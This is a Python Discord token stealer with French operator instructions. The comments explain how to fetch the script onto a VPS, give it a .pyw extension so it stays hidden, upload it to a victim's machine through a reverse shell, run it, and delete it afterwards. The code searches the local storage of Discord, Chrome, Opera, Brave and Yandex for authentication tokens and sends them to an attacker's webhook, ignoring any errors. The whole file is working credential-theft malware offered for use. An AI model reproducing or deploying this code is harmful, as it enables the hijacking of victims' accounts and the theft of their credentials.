# Programme réalisé : Aucune idée, mais pas moi 

# Entrain d'être écrit, via ce programme vous pourrez mettre un webhook discord est récupéré automatiquement le token discord de la cible

# Etape 1 :
# A faire sur votre VPS
# curl https://raw.githubusercontent.com/DictateurMiro/reverse-shell/main/addons/discord-token.pyw -o token.pyw 
# pensez bien à mettre '.pyw' et pas '.py' pour éviter que ça soit visible
# éditez pour mettre votre webhook dans le fichier

# Etape 2 :
# upload [Chemin d'acces du fichier] (Regardez le README.md, si vous avez besoin d'aide)

# Etape 3 :
# python token.pyw (dans le dossier Downloads, PS: Pour allez sur le fihicer 'cd .. && cd .. && cd Downloads && python token.pyw', CECI EST UN EXEMPLE TROUVEZ OU EST LE FICHIER en utilisant des DIR)

# Etape 4 :
# del token.pyw

########################################################################################################################################

import os
import re
import json
from urllib.request import Request, urlopen

WEBHOOK_URL = 'VOTRE WEBHOOK'

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
